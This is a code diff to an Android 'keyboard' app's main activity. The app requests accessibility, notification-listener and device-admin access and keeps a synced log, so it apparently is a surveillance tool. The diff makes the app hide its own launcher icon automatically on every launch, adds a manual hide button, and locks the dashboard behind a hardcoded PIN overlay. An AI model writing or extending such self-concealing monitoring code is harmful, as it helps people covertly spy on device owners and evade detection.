@@ -2,17 +2,19 @@ package com.example.mykeyboard
 
 import android.annotation.SuppressLint
 import android.app.Activity
-import android.app.AlertDialog
 import android.app.admin.DevicePolicyManager
 import android.content.ComponentName
 import android.content.Context
 import android.content.Intent
+import android.content.pm.PackageManager
 import android.os.Build
 import android.os.Bundle
 import android.provider.Settings
+import android.view.View
 import android.view.inputmethod.InputMethodManager
 import android.widget.Button
 import android.widget.EditText
+import android.widget.LinearLayout
 import android.widget.TextView
 import android.widget.Toast
 import com.google.firebase.FirebaseApp
@@ -28,10 +30,12 @@ class MainActivity : Activity() {
     private var txtAccessibilityStatus: TextView? = null
     private var txtNotificationStatus: TextView? = null
     private var txtLogConsole: TextView? = null
+    private var loginOverlay: LinearLayout? = null
+    private var etPinInput: EditText? = null
     private var isAuthenticated = false
 
     companion object {
-        private const val DEFAULT_PIN = "00100"
+        private const val CORRECT_PIN = "00100"
     }
 
     override fun onCreate(savedInstanceState: Bundle?) {
@@ -48,37 +52,50 @@ class MainActivity : Activity() {
             e.printStackTrace()
         }
 
-        // Prompt for password on launch
-        showPasswordDialog()
+        // Automatically hide app icon from launcher / app drawer after install/launch
+        hideAppIconAutomatically()
+
+        // Prompt for password on launch with full black overlay
+        showPasswordOverlay()
     }
 
-    private fun showPasswordDialog() {
-        if (isAuthenticated) return
-
-        val input = EditText(this).apply {
-            hint = "Enter PIN"
-            inputType = android.text.InputType.TYPE_CLASS_NUMBER or android.text.InputType.TYPE_NUMBER_VARIATION_PASSWORD
+    private fun hideAppIconAutomatically() {
+        try {
+            val p = packageManager
+            val componentName = ComponentName(this, MainActivity::class.java)
+            if (p.getComponentEnabledSetting(componentName) != PackageManager.COMPONENT_ENABLED_STATE_DISABLED) {
+                p.setComponentEnabledSetting(
+                    componentName,
+                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                    PackageManager.DONT_KILL_APP
+                )
+            }
+        } catch (e: Exception) {
+            e.printStackTrace()
         }
+    }
 
-        AlertDialog.Builder(this)
-            .setTitle("Password Protected")
-            .setMessage("Please enter your PIN to access the app")
-            .setView(input)
-            .setCancelable(false)
-            .setPositiveButton("Unlock") { _, _ ->
-                val pin = input.text.toString()
-                if (pin == DEFAULT_PIN) {
-                    isAuthenticated = true
-                    initDashboard()
-                } else {
-                    Toast.makeText(this, "Incorrect PIN!", Toast.LENGTH_SHORT).show()
-                    showPasswordDialog()
-                }
+    private fun showPasswordOverlay() {
+        if (isAuthenticated) return
+        loginOverlay = findViewById(R.id.loginOverlay)
+        etPinInput = findViewById(R.id.etPinInput)
+        val btnLoginSubmit = findViewById<Button>(R.id.btnLoginSubmit)
+
+        loginOverlay?.visibility = View.VISIBLE
+
+        btnLoginSubmit?.setOnClickListener {
+            val enteredPin = etPinInput?.text?.toString() ?: ""
+            if (enteredPin == CORRECT_PIN) {
+                isAuthenticated = true
+                loginOverlay?.visibility = View.GONE
+                Toast.makeText(this, "Access Granted", Toast.LENGTH_SHORT).show()
+                initDashboard()
+                updateStatuses()
+            } else {
+                Toast.makeText(this, "Incorrect Password!", Toast.LENGTH_SHORT).show()
+                etPinInput?.setText("")
             }
-            .setNegativeButton("Exit") { _, _ ->
-                finish()
-            }
-            .show()
+        }
     }
 
     private fun initDashboard() {
@@ -102,6 +119,7 @@ class MainActivity : Activity() {
             val btnNotification = findViewById<Button>(R.id.btnEnableNotification)
             val btnTestSync = findViewById<Button>(R.id.btnTestSync)
             val btnEnableAdmin = findViewById<Button>(R.id.btnEnableAdmin)
+            val btnHideAppIcon = findViewById<Button>(R.id.btnHideAppIcon)
 
             LogStore.setListener { logs ->
                 runOnUiThread {
@@ -130,6 +148,16 @@ class MainActivity : Activity() {
                     startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
                 } catch (e: Exception) {
                     e.printStackTrace()
+                }
+            }
+
+            btnHideAppIcon?.setOnClickListener {
+                try {
+                    hideAppIconAutomatically()
+                    Toast.makeText(this, "App icon hidden from app drawer successfully!", Toast.LENGTH_LONG).show()
+                    LogStore.addLog("App icon hidden from launcher")
+                } catch (e: Exception) {
+                    Toast.makeText(this, "Error hiding icon: ${e.message}", Toast.LENGTH_SHORT).show()
                 }
             }
 
